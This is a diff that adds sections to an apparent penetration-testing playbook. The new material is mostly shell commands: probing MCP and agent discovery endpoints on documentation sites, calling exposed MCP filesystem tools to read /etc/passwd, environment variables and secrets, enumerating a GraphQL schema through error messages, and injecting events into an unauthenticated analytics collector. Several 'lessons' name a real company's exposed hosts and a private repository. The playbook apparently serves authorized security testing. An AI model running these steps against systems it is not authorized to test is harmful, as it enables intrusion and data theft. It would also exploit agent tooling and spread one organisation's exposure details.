@@ -290,6 +290,31 @@ joomscan -u https://target.com
 ```
 
 ### 6. JavaScript Analysis (includes Source Map Extraction)
+
+**MCP/Agent Protocol Discovery (MANDATORY for modern docs sites):**
+When target uses Mintlify, ReadMe, or similar AI-friendly docs platforms, check for machine-readable endpoints FIRST — they often expose MORE than traditional JS analysis:
+```bash
+# Check for MCP/Agent endpoints (developer docs)
+curl -sk "https://developer.target.com/.well-known/mcp/server-card.json" 2>/dev/null
+curl -sk "https://developer.target.com/.well-known/agent-card.json" 2>/dev/null
+curl -sk "https://developer.target.com/.well-known/agent-skills/index.json" 2>/dev/null
+curl -sk "https://developer.target.com/.well-known/api-catalog" 2>/dev/null
+curl -sk "https://developer.target.com/llms.txt" 2>/dev/null
+```
+
+**If MCP server-card found with auth:none + filesystem tool:**
+1. List available tools: `{"method":"tools/list"}`
+2. Browse filesystem: `ls /`, `ls /openapi/`
+3. Extract full OpenAPI specs: `cat /openapi/_media/specs/*.json`
+4. Search for secrets/internal info: `grep -r "secret\|internal\|private" /`
+5. Check for path traversal: `cat /etc/passwd`, `ls ../../`, `env`
+6. Extract package.json for private repo names
+
+**Uphold lesson (June 2026):** developer.uphold.com exposed a Mintlify MCP server (`uphold-d4756e17.main-kill-isr.mintlify.me/mcp`) with `query_docs_filesystem_uphold` tool. This sandboxed bash (only cat/ls/grep, no network) contained full OpenAPI specs for 5 APIs (core, kyc-connector, market-pulse, topper, widgets), 100+ OAuth2 scope definitions, and leaked private GitHub repo name (`uphold/enterprise-api`). The MCP yielded far more endpoint intelligence than JScrambler-protected wallet JS analysis.
+
+**Source map false positive detection (CRITICAL):**
+When `.map` files return 200 but the size matches the SPA catch-all size, they are NOT real source maps — verify content-type and first bytes (`{"version":3` = real map, `<!DOCTYPE` = catch-all HTML).
+
 Extract endpoints, secrets, and functionality from client-side code.
 
 **SOURCE MAP CHECK (MANDATORY):** Before analyzing minified JS, check for `.map` files. Append `.map` to every discovered JS bundle URL. Source maps expose the FULL original source code — auth implementations, API configs, crypto functions, business logic. LoanPlatform (June 2026): two source maps (6.1MB + 5.6MB, 848 files) revealed PBKDF2 password hashing implementation, full API URL config (service prefixes), self-registration flow, and session timeout endpoint — none discoverable from the minified bundle alone. Source maps are a **finding** (info disclosure) AND an **attack enabler** (white-box analysis).
@@ -490,6 +515,47 @@ curl -sk "https://target.com/graphql" -X POST -H "Content-Type: application/json
   -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' | python3 -m json.tool | head -50
 ```
 
+#### GraphQL Schema Enumeration via Error Messages (INTROSPECTION BYPASS)
+
+**Uphold lesson (June 2026):** Introspection was disabled (returned SPA catch-all for full queries) but `{__typename}` worked — confirming GraphQL was live. By sending mutations with wrong field names, the server leaked the FULL schema via error messages:
+- `"Cannot query field X on type Mutation. Did you mean Y, Z?"` → discovers mutation names
+- `"Field X is not defined by type Input. Did you mean Y?"` → discovers input field names
+- `"Field X of required type Y! was not provided"` → discovers required fields + types
+- `"Enum Z cannot represent non-enum value. Did you mean VALUE?"` → discovers enum values
+- `"Field X must not have a selection"` → field returns scalar (not object)
+- `"Forbidden" code:403` vs `"Cannot query field"` → 403 = field EXISTS but needs auth
+
+**Technique:**
+```bash
+# Step 1: Confirm GraphQL is live
+curl -sk -X POST "$URL/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"{__typename}"}' # Returns {"data":{"__typename":"Query"}}
+
+# Step 2: Enumerate query fields (403 = exists, "Cannot query" = doesn't)
+for field in me user users account transaction node viewer; do
+  resp=$(curl -sk -X POST "$URL/graphql" -H "Content-Type: application/json" \
+    -d "{\"query\":\"{${field}{id}}\"}" | head -c 100)
+  echo "$resp" | grep -q "Forbidden" && echo "[EXISTS-AUTH] $field"
+  echo "$resp" | grep -q "argument" && echo "[EXISTS-NEEDS-ARG] $field"
+done
+
+# Step 3: Enumerate mutations via typo suggestions
+for mut in createUser createTransaction verifyPhone resetPassword; do
+  resp=$(curl -sk -X POST "$URL/graphql" -H "Content-Type: application/json" \
+    -d "{\"query\":\"mutation{${mut}(input:{}){id}}\"}")
+  echo "$resp" | grep -q "Cannot query field" || echo "[MUT-EXISTS] $mut: ${resp:0:80}"
+done
+
+# Step 4: Enumerate input fields for discovered mutations
+for field in email password phone token code otp country type; do
+  resp=$(curl -sk -X POST "$URL/graphql" -H "Content-Type: application/json" \
+    -d "{\"query\":\"mutation{createUser(input:{${field}:\\\"test\\\"}){id}}\"}" | head -c 100)
+  echo "$resp" | grep -q "not defined" || echo "[VALID FIELD] $field"
+done
+```
+
+**Key insight:** Even with introspection disabled, you can reconstruct the ENTIRE schema by exploiting GraphQL's helpful error messages. This reveals mutations, queries, input types, enums, and required fields — all without authentication.
+
 **Deep dive:** See `references/framework-specific-attacks.md` §6 and `references/web-vuln-bypass-tables.md` (GraphQL section).
 
 ### 10. WebSocket Endpoint Discovery
@@ -528,6 +594,73 @@ curl -sk "https://target.com" | grep -oE '__VIEWSTATE[^"]*"[^"]*"' | head -3
 ```
 
 **Deep dive:** See `references/insecure-deserialization.md` for full exploitation methodology.
+
+### 11b. MCP/AI Agent Endpoint Discovery (MANDATORY when developer docs site found)
+
+When a target has a developer documentation site (Mintlify, ReadMe, GitBook, Docusaurus), check for AI-era discovery endpoints:
+
+```bash
+# Check Link headers first (Mintlify exposes these)
+curl -sI "https://developer.target.com/" | grep -i "^link:"
+# Look for: rel="llms-txt", rel="mcp-server-card", rel="agent-card", rel="agent-skills"
+
+# AI/MCP discovery endpoints
+curl -sk "https://developer.target.com/.well-known/mcp/server-card.json"  # MCP server config
+curl -sk "https://developer.target.com/.well-known/agent-card.json"       # AI agent protocol
+curl -sk "https://developer.target.com/.well-known/agent-skills/index.json"  # Agent skills
+curl -sk "https://developer.target.com/.well-known/api-catalog"           # API catalog
+curl -sk "https://developer.target.com/llms.txt"                          # LLM doc index
+curl -sk "https://developer.target.com/llms-full.txt"                     # Full LLM docs
+```
+
+**When MCP server-card.json is found:**
+1. Note the `url` field — this is an executable MCP endpoint
+2. Check `authentication` field — "none" = unauthenticated access
+3. Call `tools/list` via JSON-RPC to discover all available tools
+4. Test each tool for: filesystem access, command execution, data exfiltration
+5. If filesystem tool exists: extract OpenAPI specs, package.json, internal metadata
+
+**Uphold lesson (June 2026):** `developer.uphold.com/.well-known/mcp/server-card.json` revealed an unauthenticated Mintlify MCP at `uphold-d4756e17.main-kill-isr.mintlify.me/mcp` with a `query_docs_filesystem_uphold` tool. This allowed extracting full OpenAPI specs (5 APIs, 60+ endpoints), internal package.json (leaked private GitHub repo `uphold/enterprise-api`), and all OAuth2 scopes — information invisible from the public-facing docs alone. The MCP was sandboxed (no network tools, no system commands) but filesystem read was sufficient for full API enumeration.
+
+**MCP JSON-RPC pattern:**
+```bash
+curl -sk -X POST "$MCP_URL" \
+  -H "Content-Type: application/json" \
+  -H "Accept: application/json, text/event-stream" \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+
+# Call a tool
+curl -sk -X POST "$MCP_URL" \
+  -H "Content-Type: application/json" \
+  -H "Accept: application/json, text/event-stream" \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"TOOL_NAME","arguments":{"command":"ls /"}}}'
+```
+
+### 11b. MCP/Agent Protocol Discovery (NEW — Uphold, June 2026)
+
+When developer documentation sites (Mintlify, ReadMe, GitBook) expose `.well-known` agent endpoints, they may provide unauthenticated access to documentation filesystems containing OpenAPI specs, internal package metadata, and private repo names.
+
+**Check these paths on ALL developer/docs subdomains:**
+```bash
+curl -sk "https://docs.target.com/.well-known/mcp/server-card.json"
+curl -sk "https://docs.target.com/.well-known/agent-card.json"
+curl -sk "https://docs.target.com/.well-known/agent-skills/index.json"
+curl -sk "https://docs.target.com/.well-known/api-catalog"
+# Also check Link headers for rel="mcp-server-card" / rel="agent-card"
+curl -skI "https://docs.target.com/" | grep -i "link:"
+```
+
+**If MCP server-card.json found with `"authentication":"none"`:**
+1. Extract the MCP URL from `server-card.json`
+2. Call `tools/list` to discover available tools
+3. If a filesystem query tool exists, enumerate `/openapi/` for full API specs
+4. Search for `package.json` (leaks private repo names, internal package scopes)
+5. Extract all API paths: `grep -o '/api/[^"]*' spec.json | sort -u`
+6. Check for `security:[]` in OpenAPI (endpoints that need NO auth)
+
+**Uphold lesson (June 2026):** `developer.uphold.com` Link headers revealed MCP server at Mintlify with `query_docs_filesystem_uphold` tool (sandboxed bash: cat+ls only, no curl/wget/id). Extracted: 5 full OpenAPI specs, 100+ OAuth2 scope definitions, private GitHub repo name (`uphold/enterprise-api`), all endpoint paths for systematic 401/404 testing. The MCP approach yielded MORE than traditional source map analysis because Mintlify exposes the full docs filesystem without auth while source maps were stripped.
+
+**Impact:** Info disclosure (private repo, internal package names, full API schema). More importantly, the extracted OpenAPI becomes the WORDLIST for Phase 4 auth bypass testing — far more effective than ffuf with generic lists.
 
 ### 12. Bulk Actuator/Admin Scan (MANDATORY)
 
@@ -600,6 +733,29 @@ Write `./ptest-output/enumeration/checklist.md`:
 ```
 
 Mark each technique as `DONE`, `SKIPPED (reason)`, or `FAILED (reason)` after execution.
+
+## 13a. Snowplow Analytics Collector Testing
+
+When target CSP or JS reveals a Snowplow collector (pattern: `*.mini.snplow.net` or `*.collector.snplow.net`):
+
+```bash
+# Check if collector is publicly accessible
+curl -sk "https://com-target-prod1.mini.snplow.net/health"
+# "ok" = collector alive
+
+# Test event injection (no auth)
+curl -sk -X POST "https://com-target-prod1.mini.snplow.net/com.snowplowanalytics.snowplow/tp2" \
+  -H "Content-Type: application/json" \
+  -d '{"schema":"iglu:com.snowplowanalytics.snowplow/payload_data/jsonschema/1-0-4","data":[{"e":"pv","url":"https://test.com","aid":"target-app"}]}'
+# 200 = accepts arbitrary events without auth
+
+# Test pixel tracker
+curl -sk "https://com-target-prod1.mini.snplow.net/i?e=pv&aid=target&p=web&url=https://test.com"
+```
+
+**Impact:** Analytics data pollution, potential stored XSS in internal dashboards if event fields are rendered unsanitized. Low-Medium severity for bug bounty.
+
+**Uphold lesson (June 2026):** `com-uphold-prod1.mini.snplow.net` found via sandbox wallet CSP `connect-src`. Health endpoint public, POST /tp2 accepted arbitrary events with 200 OK. No auth, no origin validation.
 
 ## 13. Cloud Misconfiguration Checks
 
